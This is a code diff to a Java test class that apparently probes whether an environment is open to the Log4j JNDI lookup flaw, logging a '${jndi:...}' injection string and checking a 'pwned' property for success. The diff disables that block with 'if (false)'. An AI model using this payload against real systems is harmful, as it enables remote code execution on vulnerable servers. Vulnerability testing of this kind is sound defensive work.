@@ -69,13 +69,13 @@ public class LDAPTest {
         System.out.println("com.sun.jndi.ldap.object.trustURLCodebase: " + trustURL);
         System.out.println("Using lookup: " + lookup);
         System.out.println("Java Version: " + System.getProperty("java.version"));
-        try {
+        if (false) try {
             Logger logger = org.apache.logging.log4j.LogManager.getLogger();
             logger.error("Using log4j version: " + logger.getClass().getPackage().getImplementationVersion());
             logger.error("${jndi:" + lookup + "}");
-            if (System.getProperty("pwned") != null) {
+            if (System.getProperty("pwned") != null){
                 logger.error("Great success!");
-            } else {
+            }else{
                 logger.error("Fail");
             }
             return;
